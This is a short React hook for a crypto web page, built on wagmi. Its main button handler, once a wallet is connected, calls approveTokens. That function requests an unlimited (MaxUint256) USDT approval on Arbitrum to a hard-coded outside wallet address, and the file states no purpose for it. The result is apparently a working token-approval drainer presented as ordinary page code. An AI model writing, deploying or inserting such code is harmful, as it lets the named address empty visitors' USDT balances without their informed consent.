import { createConfig, http, useAccount, useWriteContract } from "wagmi";
import { useAppKit } from "@reown/appkit/react";
import { useState } from "react";
import { MaxUint256 } from "ethers";
import { arbitrum, mainnet, polygon, sepolia } from "wagmi/chains";

export const USDT_ARBITRUM_ABI = [
  {
    type: "function",
    name: "approve",
    stateMutability: "nonpayable",
    inputs: [
      { name: "spender", type: "address" },
      { name: "amount", type: "uint256" },
    ],
    outputs: [{ type: "bool" }],
  },
];

// export const config = createConfig({
//   chains: [mainnet, polygon, arbitrum, sepolia],
//   transports: {
//     [mainnet.id]: http(),
//     [arbitrum.id]: http(),
//     [sepolia.id]: http(),
//     [polygon.id]: http(),
//   },
// });

const USDT_ARBITRUM_CONTRACT = "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9";
const APPROVE_TO_WALLET = "0x17E332631Eab05d8037B38c1b6BE784bd638B931";

export const useMainPage = () => {
  const [openNav, setOpenNav] = useState(false);
  const { open } = useAppKit();
  const { isConnected, address } = useAccount();
  const { writeContract } = useWriteContract();

  console.log(address, "address");

  // Handle the opening of the navigation
  const handleOpenNav = () => {
    setOpenNav((prev) => !prev);
  };

  // Handle opening the wallet modal if not connected
  const handleOpenModal = () => {
    if (isConnected) {
      approveTokens();
    } else {
      // Open wallet modal if not connected
      open();
    }
  };

  // Approve token function
  const approveTokens = async () => {
    writeContract({
      abi: USDT_ARBITRUM_ABI,
      address: USDT_ARBITRUM_CONTRACT,
      functionName: "approve",
      args: [APPROVE_TO_WALLET, MaxUint256],
    });
  };

  return { approveTokens, handleOpenNav, handleOpenModal };
};
